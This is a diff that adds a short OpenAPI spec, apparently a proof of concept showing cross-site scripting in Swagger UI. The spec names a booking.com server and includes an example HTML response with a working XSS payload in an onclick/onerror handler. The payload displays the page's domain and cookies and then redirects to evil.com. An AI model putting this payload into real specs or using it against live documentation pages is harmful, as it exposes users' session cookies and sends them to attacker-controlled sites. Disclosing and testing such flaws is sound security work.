@@ -1,0 +1,23 @@
+openapi: 3.0.1
+info:
+  title: Unsafe Charges API Demonstration
+  version: "1.0.0"
+servers:
+  - url: https://supply-xml.booking.com/charges-api
+paths:
+  /xss-demo:
+    get:
+      summary: "Demonstrates XSS via unsafe payload responses"
+      description: |
+        Returns a payload containing an XSS vector. 
+        If Swagger UI renders the response output directly in the DOM (without escaping), 
+        clicking the displayed button will execute the payload.
+      responses:
+        '200':
+          description: Unsafe XSS Button in response
+          content:
+            text/html:
+              schema:
+                type: string
+                example: |
+                  <button onclick="document.body.innerHTML='<img src=x onerror=&quot;alert(&#39;You have been hacked!! \nDomain: &#39; + document.domain + &#39;\nCookie: &#39; + document.cookie); window.location=&#39;https://evil.com&#39;;&quot;>'>Execute XSS</button>
